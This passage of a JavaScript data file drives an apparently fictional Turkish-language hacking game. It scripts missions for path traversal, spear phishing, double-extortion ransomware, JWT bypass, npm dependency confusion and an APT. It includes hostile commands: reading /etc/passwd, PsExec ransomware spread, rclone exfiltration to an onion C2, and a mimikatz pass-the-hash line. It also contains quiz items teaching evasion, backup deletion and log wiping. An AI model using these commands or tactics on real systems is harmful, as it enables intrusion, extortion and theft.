              { text: '[*] Şirket CISO\'suna şifreli mesaj gönderiliyor...', cls: 'cmd-info', delay: 200 },
              { text: '[✓] Fidye notu teslim edildi. Yanıt bekleniyor.', cls: 'cmd-success', delay: 600 },
            ]
          },
          {
            text: '3) Broker\'a ilet — küçük ödül ama tamamen anonim',
            rewardBonus: 8, suspicionBonus: 0,
            feedbackLines: [
              { text: '[*] Şifreli kanal üzerinden Broker\'a gönderiliyor...', cls: 'cmd-info', delay: 200 },
              { text: '[✓] Broker veriyi teslim aldı. Ödeme yapıldı.', cls: 'cmd-success', delay: 600 },
            ]
          },
        ]
      },
    ],
    'dir-traversal': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  DİZİN GEZİNME ARAŞTIRMASI    ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Dosya okuma parametresi aranıyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ ffuf -u "<HEDEF>/FUZZ" -w lfi_params.txt', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 300 },
          { text: '  [FOUND] /view_file.php?file=about.txt [200 OK]', cls: 'cmd-success', delay: 400 },
          { text: '  [FOUND] /download.php?path=docs/manual.pdf [200 OK]', cls: 'cmd-success', delay: 400 },
          { text: '', delay: 200 },
          { text: '[!] "file" ve "path" parametreleri doğrudan dosya okuma yapıyor!', cls: 'cmd-warning', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 2/5]  PATH TRAVERSAL PAYLOAD         ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] /etc/passwd dosyasını okumak için traversal payload\'ı yaz:', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: '../../../../etc/passwd',
        timeLimit: 20,
        hint: 'Her ../ bir dizin yukarı çıkar!',
        successFeedback: '[✓] /etc/passwd okundu! root:x:0:0:root:/root:/bin/bash...',
        failFeedback: '[✗] Hatalı path — sunucu dizin atlama tespit etti!',
      },
      {
        type: 'question',
        question: '[AŞAMA 3/5] .env dosyasında ne tür bilgiler bulabilirsin?',
        options: [
          '1) DB şifreleri, API anahtarları, gizli token\'lar',
          '2) CSS dosyaları ve frontend kodları',
          '3) Sadece uygulama versiyonu',
        ],
        answer: 1,
        penalty: 10,
        successFeedback: '[✓] .env\'de DB_PASSWORD=admin123, AWS_SECRET=AKIAIO... bulundu!',
        failFeedback: '[✗] Yanlış! .env backend gizli değerlerini saklar.',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  DOSYA İNDİRME                 ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Kritik dosyalar indirildi. İşte bulunanlar:', cls: 'cmd-output', delay: 300 },
          { text: '    ├── .env         (DB_PASS, API keys)', cls: 'cmd-warning', delay: 300 },
          { text: '    ├── config.php   (MySQL credentials)', cls: 'cmd-warning', delay: 300 },
          { text: '    ├── /etc/shadow  (hash\'lenmiş şifreler)', cls: 'cmd-warning', delay: 300 },
          { text: '', delay: 200 },
          { text: '[*] Tüm dosyalar C2\'ye aktarılıyor...', cls: 'cmd-output', delay: 300 },
        ],
        label: 'Dosya Aktarım:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] Tüm kritik dosyalar indirildi.', cls: 'cmd-success', delay: 300 },
        ]
      },
      {
        type: 'choice',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  DB ERİŞİMİ İLE NE YAPACAKSIN? ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Artık DB şifren var. Ne yapacaksın?', cls: 'cmd-output', delay: 300 },
        ],
        choices: [
          {
            text: '1) MySQL\'e bağlan, tüm tabloları dump et',
            rewardBonus: 25, suspicionBonus: 15,
            feedbackLines: [
              { text: '[*] mysql -h <HEDEF> -u root -p\'admin123\'', cls: 'cmd-info', delay: 200 },
              { text: '[✓] Bağlantı başarılı! Tüm tablolar dump edildi.', cls: 'cmd-success', delay: 600 },
            ]
          },
          {
            text: '2) AWS anahtarını kullan — bulut altyapısına gir',
            rewardBonus: 40, suspicionBonus: 20,
            feedbackLines: [
              { text: '[*] aws configure → AWS_SECRET aktif edildi.', cls: 'cmd-info', delay: 200 },
              { text: '[✓] S3 bucket\'lara ve EC2\'lara tam erişim!', cls: 'cmd-success', delay: 600 },
            ]
          },
          {
            text: '3) Sadece verileri belgele, ilerisi için sakla',
            rewardBonus: 5, suspicionBonus: 0,
            feedbackLines: [
              { text: '[*] Dosyalar şifreli arşive kopyalandı.', cls: 'cmd-info', delay: 200 },
              { text: '[✓] İz bırakılmadı.', cls: 'cmd-success', delay: 400 },
            ]
          },
        ]
      },
    ],
    'phishing': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  HEDEF ÇALIŞAN ARAŞTIRMASI     ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] LinkedIn ve kurumsal site analiz ediliyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ theHarvester -d hedefbank.com.tr -b linkedin,google', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 300 },
          { text: '  [+] ali.demir@hedefbank.com.tr — IT Yöneticisi', cls: 'cmd-success', delay: 400 },
          { text: '  [+] fatma.yilmaz@hedefbank.com.tr — Muhasebe Müdürü', cls: 'cmd-success', delay: 400 },
          { text: '  [+] mehmet.kaya@hedefbank.com.tr — CISO', cls: 'cmd-success', delay: 400 },
          { text: '', delay: 200 },
          { text: '[!] Muhasebe müdürü hedefiniz — para transferlerine yetkisi var!', cls: 'cmd-warning', delay: 500 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] Hangi e-posta şablonu daha yüksek tıklanma oranı sağlar?',
        options: [
          '1) "ACİL: Banka sisteminde şüpheli giriş tespit edildi — Şifrenizi hemen doğrulayın"',
          '2) "Merhaba, nasıl gidiyor? Bir teklifim var."',
          '3) "Dizüstü bilgisayar satışı — uygun fiyat"',
        ],
        answer: 1,
        penalty: 10,
        successFeedback: '[✓] Aciliyet + korku kombinasyonu — %72 tıklanma oranı.',
        failFeedback: '[✗] İlgi çekmeyen şablon — spam\'e düşer!',
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  SAHTE DOMAIN KAYDET            ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Typosquatting domain satın alınacak.', cls: 'cmd-output', delay: 300 },
          { text: '[*] En inandırıcı sahte domain\'i yaz:', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: 'hedefbank-guvenlik-portali.net',
        timeLimit: 20,
        hint: 'Orijinal domain\'e benzer ama farklı bir alan adı!',
        successFeedback: '[✓] Domain kaydedildi ve SSL sertifikası oluşturuldu.',
        failFeedback: '[✗] Bu domain çok şüpheli görünüyor — spam filtrelerine takılır!',
      },
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  SAHTE SAYFA + MAIL GÖNDER     ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] HedefBank login sayfası klonlanıyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ httrack https://hedefbank.com.tr --clone', cls: 'cmd-info', delay: 500 },
          { text: '[✓] Klonlama tamamlandı. Sahte sayfa sunucuya yüklendi.', cls: 'cmd-success', delay: 600 },
          { text: '', delay: 200 },
          { text: '[*] Reverse proxy (Evilginx) kurulumu...', cls: 'cmd-output', delay: 400 },
          { text: '[✓] 2FA kod yakalama sistemi aktif!', cls: 'cmd-success', delay: 500 },
          { text: '', delay: 200 },
          { text: '[*] fatma.yilmaz@hedefbank.com.tr adresine e-posta gönderiliyor...', cls: 'cmd-output', delay: 400 },
          { text: '[✓] E-posta teslim edildi! Kurban tıklaması bekleniyor...', cls: 'cmd-success', delay: 600 },
          { text: '    ...', cls: 'cmd-output', delay: 800 },
          { text: '    ...', cls: 'cmd-output', delay: 800 },
          { text: '    ...', cls: 'cmd-output', delay: 800 },
          { text: '[!] AKTİVİTE! Kurban linke tıkladı!', cls: 'cmd-warning', delay: 500 },
          { text: '[✓] Kimlik bilgileri yakalandı: fatma.yilmaz : Tr06!K44', cls: 'cmd-success', delay: 400 },
          { text: '[✓] 2FA kodu gerçek zamanlı yakalandı: 847291', cls: 'cmd-success', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  BACKDOOR + İZ TEMİZLE         ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Çalınan kimlikle sisteme giriliyor...', cls: 'cmd-output', delay: 300 },
          { text: '[✓] Muhasebe paneline erişim sağlandı!', cls: 'cmd-success', delay: 500 },
          { text: '[*] Firewall\'a backdoor kuruluyor...', cls: 'cmd-output', delay: 400 },
        ],
        label: 'Backdoor Kurulum:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] Dış güvenlik duvarı aşıldı, backdoor yerleştirildi.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Phishing altyapısı silindi — iz temizlendi.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Spear Phishing operasyonu tamamlandı.', cls: 'cmd-success', delay: 300 },
          { text: '', delay: 200 },
        ]
      },
    ],
    'double-extortion': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  AĞDA LATERAL MOVEMENT         ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Önceki exploit\'ten elde edilen erişimle ağda ilerleniyor...', cls: 'cmd-output', delay: 400 },
          { text: '[*] Active Directory keşfi başlatılıyor...', cls: 'cmd-output', delay: 300 },
          { text: '    $ bloodhound-python -d hedefbank.local -u svc_backup -p Tr@p', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 300 },
          { text: '  Domain Admin bulundu: DA-HEDEFBANK\\adminservice', cls: 'cmd-warning', delay: 400 },
          { text: '  Dosya sunucusu: FS01 (192.168.1.10)', cls: 'cmd-warning', delay: 300 },
          { text: '  Yedek sunucu: BACKUP01 (192.168.1.50)', cls: 'cmd-warning', delay: 300 },
          { text: '  Finans uygulaması: FINANCE-APP (192.168.1.20)', cls: 'cmd-error', delay: 300 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] Çifte şantaj stratejisinin DOĞRU sırası hangisidir?',
        options: [
          '1) Önce kritik verileri exfiltrate et (sızdır), SONRA şifrele',
          '2) Önce şifrele, sonra sızdır — kurban farkına daha geç varır',
          '3) Sadece şifrele — fidye ödenince anahtar ver',
        ],
        answer: 1,
        penalty: 15,
        successFeedback: '[✓] Önce veri sızdır! Şifreden önce elimizde olmasın diye yedek alamaz.',
        failFeedback: '[✗] Önce şifrelersin — kurban hemen yedekten geri döner!',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  KRİTİK VERİ SIZDIRILIYor     ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] FINANCE-APP sunucusundan müşteri/muhasebe verisi sızdırılıyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ rclone sync //<FINANCE-APP>/shares/ onion://c2/victim/', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 200 },
        ],
        label: 'Sızdırma:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] 847 GB finansal veri C2\'ye aktarıldı.', cls: 'cmd-success', delay: 300 },
          { text: '[*] Şifreleme aşamasına geçiliyor...', cls: 'cmd-output', delay: 400 },
        ]
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  RANSOMWARE DEPLOY               ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Ağdaki tüm sistemlere ransomware dağıtılacak.', cls: 'cmd-output', delay: 300 },
          { text: '[*] PsExec ile ağ geneline yayılım komutunu yaz:', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: 'psexec \\\\* -d C:\\Windows\\Temp\\payload.exe',
        timeLimit: 25,
        hint: 'PsExec ile tüm domaine yay!',
        successFeedback: '[✓] Ransomware ağa yayıldı! AES-256 şifreleme başladı...',
        failFeedback: '[✗] Hatalı komut! Yayılım başarısız, şüphe arttı!',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  ŞİFRELEME & FİDYE NOTU       ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Dosyalar AES-256 ile şifreleniyor...', cls: 'cmd-output', delay: 300 },
          { text: '[*] RSA-4096 ile şifreleme anahtarı korunuyor...', cls: 'cmd-output', delay: 300 },
        ],
        label: 'Şifreleme:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] Tüm kritik sistemler şifrelendi!', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Her dizine DECRYPT_INSTRUCTIONS.txt bırakıldı.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Sızdırılan verinin %10\'u "kanıt" olarak yayınlandı.', cls: 'cmd-success', delay: 400 },
          { text: '"Para ver veya tüm finansal kayıtların internete düşer."', cls: 'cmd-error', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
    ],
    'zero-day': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  SIFIRINCI GÜN EXPLOİT HAZIRLA ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Kişisel sıfırıncı gün araştırma sonuçlarına bakılıyor...', cls: 'cmd-output', delay: 400 },
          { text: '[!] YENİ AÇIK: Hedef\'in özel admin panelinde', cls: 'cmd-warning', delay: 500 },
          { text: '    Auth bypass — JWT token imzalaması doğrulanmıyor!', cls: 'cmd-error', delay: 300 },
          { text: '', delay: 200 },
          { text: '[*] CVE henüz yayınlanmamış — sadece biz biliyoruz.', cls: 'cmd-success', delay: 400 },
          { text: '[*] IDS/IPS bu exploiti tanımaz.', cls: 'cmd-success', delay: 300 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] Zero-day exploit\'in IDS\'e yakalanmaması için ne yapılmalı?',
        options: [
          '1) Payload\'ı şifrele/gizle (obfuscation) ve meşru trafiğe karıştır',
          '2) DDoS başlat — IDS\'i meşgul et',
          '3) Gece gönder — analistler uyuyor olur',
        ],
        answer: 1,
        penalty: 15,
        successFeedback: '[✓] Payload obfuscated. HTTPS trafiğine gömüldü — tamamen gizli.',
        failFeedback: '[✗] DDoS gürültülü bir saldırıdır — zero-day\'in gizliliğini bozar!',
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  JWT BYPASS PAYLOAD             ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] "alg:none" JWT bypass\'ı ile admin token oluşturuluyor.', cls: 'cmd-output', delay: 300 },
          { text: '[*] Token algorithm alanını boşaltmak için komutu yaz:', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: 'jwt-tool --exploit alg:none --role admin',
        timeLimit: 25,
        hint: 'jwt-tool ile algorithm\'ı "none" yaparak imzayı atla!',
        successFeedback: '[✓] Token imzasız admin JWT oluşturuldu! Sistem doğrulamıyor.',
        failFeedback: '[✗] Hatalı token formatı — sunucu reddetti!',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  BACKDOOR YERLEŞTİR            ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Admin paneline tam erişim sağlandı.', cls: 'cmd-success', delay: 300 },
          { text: '[*] Kalıcı reverse shell servisi kuruluyor...', cls: 'cmd-output', delay: 400 },
        ],
        label: 'Backdoor:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] /etc/systemd/system/svc_net.service aktif edildi.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Hiçbir alarm tetiklenmedi. Sistem normal görünüyor.', cls: 'cmd-success', delay: 400 },
        ]
      },
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  OPERASYON KAPANDI              ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[✓] Zero-day exploit başarıyla kullanıldı.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Tam sistem erişimi sağlandı.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Hiçbir IDS/IPS alarmı tetiklenmedi.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Tüm bağlantı logları silindi.', cls: 'cmd-success', delay: 300 },
          { text: '', delay: 200 },
          { text: '  Bu zafiyet şimdi sana ait. Kullanılmadığı sürece kimse bilmez.', cls: 'cmd-info', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
    ],
    'supply-chain': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  TEDARİKÇİ ANALİZİ            ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Hedefin kaynak kodları ve bağımlılıkları analiz ediliyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ cat package.json | grep dependencies', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 300 },
          { text: '  "@megacorp/internal-logger": "^2.1.0" (PRIVATE repo)', cls: 'cmd-warning', delay: 400 },
          { text: '  "@megacorp/auth-utils": "^1.3.2" (PRIVATE repo)', cls: 'cmd-warning', delay: 400 },
          { text: '', delay: 200 },
          { text: '[!] Özel paket "@megacorp/internal-logger" public NPM\'de kayıtlı değil!', cls: 'cmd-error', delay: 400 },
          { text: '[!] Dependency Confusion saldırısı mümkün!', cls: 'cmd-success', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] Tedarik zinciri saldırısının temel mantığı nedir?',
        options: [
          '1) Özel paketi public NPM\'e daha yüksek versiyon ile yükle — npm onu seçer',
          '2) Tedarikçinin şifresini kır ve sunucuya giriş yap',
          '3) Tedarikçiye DDoS atarak güncellemeleri durdur',
        ],
        answer: 1,
        penalty: 15,
        successFeedback: '[✓] npm en yüksek versiyonu önceliklendirir — public paketi indirir!',
        failFeedback: '[✗] Yanlış! Dependency confusion şifre kırmaya gerek bırakmaz.',
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  ZARALI PAKET YÜKLE            ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] NPM\'e zararlı paket yüklenecek.', cls: 'cmd-output', delay: 300 },
          { text: '[*] Paketi v99.0.0 olarak yükle (mevcut v2.1.0\'dan yüksek):', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: 'npm publish --access public @megacorp/internal-logger',
        timeLimit: 25,
        hint: 'npm publish ile public NPM\'e yükle!',
        successFeedback: '[✓] Zararlı paket v99.0.0 NPM\'e yüklendi!',
        failFeedback: '[✗] Yükleme başarısız — paket adı veya komut hatalı!',
      },
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  KURBAN BEKLENİYOR             ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] MegaCorp CI/CD pipeline\'ı npm install çalıştırıyor...', cls: 'cmd-output', delay: 400 },
          { text: '    ...', cls: 'cmd-output', delay: 1000 },
          { text: '    ...', cls: 'cmd-output', delay: 1000 },
          { text: '[!] npm install @megacorp/internal-logger@99.0.0 — PUBLIC versiyon seçildi!', cls: 'cmd-warning', delay: 600 },
          { text: '[✓] postinstall scripti çalıştı! Reverse shell C2\'ye bağlandı!', cls: 'cmd-success', delay: 600 },
          { text: '', delay: 200 },
          { text: '[✓] MegaCorp prod sunucusuna tam erişim!', cls: 'cmd-success', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  VERİ ÇEKME & İZ TEMİZLE       ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Prod veritabanı exfiltrate ediliyor...', cls: 'cmd-output', delay: 300 },
        ],
        label: 'Veri Aktarım:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] Tüm veriler aktarıldı.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Zararlı paket NPM\'den silindi — iz yok.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Supply chain saldırısı tamamlandı. Sıfır alarm.', cls: 'cmd-success', delay: 300 },
          { text: '', delay: 200 },
        ]
      },
    ],
    'apt': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  UZUN VADELİ HAZIRLIK          ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] APT operasyonu başlatıldı — sessizlik birinci öncelik.', cls: 'cmd-output', delay: 400 },
          { text: '[*] Hedef ağ 3 haftadır pasif olarak izleniyor...', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 200 },
          { text: '  Tespit edilen sistemler:', cls: 'cmd-info', delay: 300 },
          { text: '  192.168.1.1   — Domain Controller (PRIMARY)', cls: 'cmd-warning', delay: 300 },
          { text: '  192.168.1.10  — Dosya Sunucusu', cls: 'cmd-output', delay: 300 },
          { text: '  192.168.1.20  — Finans Uygulaması (HEDEF)', cls: 'cmd-error', delay: 300 },
          { text: '  192.168.1.50  — Yedek Sunucu', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 200 },
          { text: '[*] Giriş noktası: Phishing ile ele geçirilen çalışan hesabı.', cls: 'cmd-output', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] APT\'nin temel hedefi nedir?',
        options: [
          '1) Aylarca/yıllarca tespit edilmeden veri casusluğu ve kritik altyapı kontrolü',
          '2) Hızlıca para çalıp çıkmak',
          '3) Web sitesini defacement\'a uğratmak',
        ],
        answer: 1,
        penalty: 20,
        successFeedback: '[✓] Sabır APT\'nin en güçlü silahı. Tespit edilmemek = başarı.',
        failFeedback: '[✗] Hız gürültü yaratır. APT sessizliği ön planda tutar.',
      },
      {
        type: 'question',
        question: '[AŞAMA 3/5] C2 (Komuta-Kontrol) trafiğini nasıl gizleceksin?',
        options: [
          '1) DNS tünelleme + HTTPS bulut servisleri arkasına saklama (Stealth C2)',
          '2) Şüpheli portlar üzerinden düz metin iletişim',
          '3) Hedef sistemde FTP sunucusu kur',
        ],
        answer: 1,
        penalty: 20,
        successFeedback: '[✓] DNS tünelleme ve bulut arkası C2 — ağ izleme araçları göremez!',
        failFeedback: '[✗] Açık portlar ve şüpheli trafik anında tespit edilir!',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  LATERAL MOVEMENT              ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Pass-the-Hash ile Domain Controller\'a geçiliyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ mimikatz sekurlsa::pth /user:DA-admin /domain:hedefbank /ntlm:...', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 200 },
        ],
        label: 'Ağda İlerleme:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] Domain Admin ayrıcalıkları elde edildi!', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Finans uygulamasına tam erişim sağlandı.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Yedek sunucu tespit edildi — payload için hedefleniyor.', cls: 'cmd-success', delay: 400 },
        ]
      },
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  SON PAYLOAD & OPERASYON KAPAT  ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Yedekler siliniyor — kurtarma imkansız hale getiriliyor...', cls: 'cmd-output', delay: 400 },
          { text: '[✓] BACKUP01 tamamen silindi.', cls: 'cmd-success', delay: 500 },
          { text: '[*] Finans veritabanı şifreleniyor...', cls: 'cmd-output', delay: 400 },
          { text: '[✓] Tüm finansal kayıtlar kilitlendi.', cls: 'cmd-success', delay: 600 },
          { text: '', delay: 200 },
          { text: '  ╔═════════════════════════════════════╗', cls: 'cmd-error', delay: 300 },
          { text: '  ║  APT OPERASYONU BAŞARIYLA TAMAMLANDI ║', cls: 'cmd-error', delay: 100 },
          { text: '  ║  Ağ haritası: ✓  Yedekler: ✓ Silindi║', cls: 'cmd-error', delay: 100 },
          { text: '  ║  Payload: ✓  Alarm sayısı: 0        ║', cls: 'cmd-error', delay: 100 },
          { text: '  ╚═════════════════════════════════════╝', cls: 'cmd-error', delay: 100 },
          { text: '', delay: 200 },
        ]
      },
    ],
    'kernel-rootkit': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  KERNEL ERİŞİM HAZIRLIĞI       ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
